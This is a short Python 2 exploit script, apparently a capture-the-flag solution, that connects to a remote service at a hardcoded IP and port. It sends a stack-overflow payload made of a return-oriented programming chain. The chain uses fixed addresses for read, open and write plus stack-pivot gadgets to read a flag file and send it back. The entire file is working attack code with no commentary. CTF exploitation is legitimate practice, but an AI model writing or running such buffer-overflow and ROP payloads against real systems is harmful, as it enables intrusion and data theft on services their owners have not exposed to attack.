__author__ = 'HuyNA'
import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# nc 210.61.8.96 51342
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="210.61.8.96"
#local_host='192.168.248.176'
local_port = 51342

size=struct.pack("<I",0x00000080)
zero=struct.pack('<I',0x00000000)
fd=struct.pack('<I',0x00000000)
one=struct.pack('<I',0x00000001)
flag=struct.pack('<I',0x080487D0)
buffer2=struct.pack('<I',0x0804a280)
buffer1=struct.pack('<I',0x0804a100)
begin=struct.pack('<I',0x0804867F)
read_address=struct.pack('<I',0x080483E0) #0x080485BC
read_address_1=struct.pack('<I',0x080485BC)
open_address=struct.pack('<I',0x08048420)
write_address=struct.pack('<I',0x08048450)

# read
rop=read_address+begin+fd+buffer2+size
a='\x00'*108+rop

leavea = struct.pack('<I',0x0804867D)
# open
rop3=buffer2+buffer2+open_address+leavea+flag+zero
a1='\x00'*92+rop3+'\x00'*12

pop3 = struct.pack('<I',0x0804879D)	# dieu khien ebp
pop3_1=struct.pack('<I',0x080487C3)

buffer3=struct.pack('<I',0x0804a280+0x54)
write2 =struct.pack('<I',0x08048722)
# write
rop2='a'*4+pop3+'a'*8+buffer3+read_address_1+fd+buffer1+size
rop='c'*4+pop3+'\x00'*8+buffer3+write2+one+buffer1+'\x80\x00\x00\x00'
a3=rop2+'b'*0x1C+'\x02\x00\x00\x00'+'d'*0x10+rop+'\x00'*(0x20-len(rop))

a3 = a3+'\x00'*(0x80-len(a3))

s.connect((local_host, local_port))

m=a+a3+a1
print m

s.send(m)
time.sleep(0.01)
print s.recv(128)
time.sleep(0.01)


